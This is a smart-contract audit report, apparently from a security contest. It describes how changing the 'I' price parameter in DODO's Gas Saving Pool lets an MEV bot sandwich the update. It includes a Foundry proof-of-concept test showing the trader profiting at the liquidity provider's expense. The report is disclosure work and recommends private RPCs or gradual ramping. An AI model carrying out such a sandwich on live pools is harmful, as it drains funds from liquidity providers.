Witty Cerulean Panther

medium

# Adjusting "_I_" will create a sandwich opportunity because of price changes

## Summary
Adjusting the value of "I" directly influences the price. This can be exploited by a MEV bot, simply by trading just before the "adjustPrice" function and exiting right after the price change. The profit gained from this operation essentially represents potential losses for the liquidity providers who supplied liquidity to the pool.
## Vulnerability Detail
As we can see in the docs, the "_I_" is the "i" value in here and it is directly related with the output amount a trader will receive when selling a quote/base token:
<img width="581" alt="image" src="https://github.com/sherlock-audit/2023-12-dodo-gsp-mstpr/assets/120012681/61930727-f8d0-4f47-8712-32d6ada95334">

Since the price will change, the MEV bot can simply sandwich the tx. Here an example how it can be executed by a MEV bot:

```solidity
function test_Adjusting_I_CanBeFrontrunned() external {
        vm.startPrank(tapir);

        //  Buy shares with tapir, 10 - 10
        dai.safeTransfer(address(gsp), 10 * 1e18);
        usdc.transfer(address(gsp), 10 * 1e6);
        gsp.buyShares(tapir);

        // print some stuff
        console.log("Base target initial", gsp._BASE_TARGET_());
        console.log("Quote target initial", gsp._QUOTE_TARGET_());
        console.log("Base reserve initial", gsp._BASE_RESERVE_());
        console.log("Quote reserve initial", gsp._QUOTE_RESERVE_());
        
        // we know the price will decrease so lets sell the base token before that
        uint256 initialBaseTokensSwapped = 5 * 1e18;

        // sell the base tokens before adjustPrice
        dai.safeTransfer(address(gsp), initialBaseTokensSwapped);
        uint256 receivedQuoteTokens = gsp.sellBase(tapir);
        vm.stopPrank();

        // this is the tx will be sandwiched by the MEV trader
        vm.prank(MAINTAINER);
        gsp.adjustPrice(999000);

        // quickly resell whatever gained by the price update
        vm.startPrank(tapir);
        usdc.safeTransfer(address(gsp), receivedQuoteTokens);
        uint256 receivedBaseTokens = gsp.sellQuote(tapir);
        console.log("Base target", gsp._BASE_TARGET_());
        console.log("Quote target", gsp._QUOTE_TARGET_());
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());
        console.log("Received base tokens", receivedBaseTokens);

        // NOTE: the LP fee and MT FEE is set for this example, so this is not an rough assumption
        // where fees are 0. Here the fees set for both of the values (default values):
        // uint256 constant LP_FEE_RATE = 10000000000000;
        // uint256 constant MT_FEE_RATE = 10000000000000;

        // whatever we get is more than we started, in this example
        // MEV trader started 5 DAI and we have more than 5 DAI!!
        assertGe(receivedBaseTokens, initialBaseTokensSwapped);
    }
```
Test result and logs:
<img width="435" alt="image" src="https://github.com/sherlock-audit/2023-12-dodo-gsp-mstpr/assets/120012681/2c90a84e-7fba-47ef-8fe9-bbcd36a65268">

After the sandwich, we can see that the MEV bot's DAI amount exceeds its initial DAI balance (profits). Additionally, the reserves for both base and quote tokens are less than the initial 10 tokens deposited by the tapir (only LP). The profit gained by the MEV bot essentially translates to a loss for the tapir.

Another note on this is that even though the `adjustPrice` called by MAINTAINER without getting frontrunned, it still creates a big price difference which requires immediate arbitrages. Usually these type of parameter changes that impacts the trades are setted by time via ramping to mitigate the unfair advantages that it can occur during the price update.
## Impact
Medium since the adjusting price is a privileged role and it is not frequently used. However, this tx can be frontrunnable easily as we see in the PoC which would result in loss of funds. Although the admins are trusted this is not about admin being trustworthy. This is basically a common DeFi parameter change thread and should be well awared. For example, in curve/yeth/balancer contracts the ramp factors are changed via async slow update. It doesn't changes its value immediately but rather does this update slowly by every sec. For example we can see here in the yETH contract that the changing a parameter which determines the trades of users is updated slowly rather than one go:
https://github.com/yearn/yETH/blob/8d831fd6b4de9f004d419f035cd2806dc8d5cf7e/contracts/Pool.vy#L983-L997
## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPVault.sol#L169-L174
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPTrader.sol#L40-L113
## Tool used

Manual Review

## Recommendation
Acknowledge the issue and use private RPC's to eliminate front-running or slowly ramp up the "I" so that the arbitrage opportunity is fair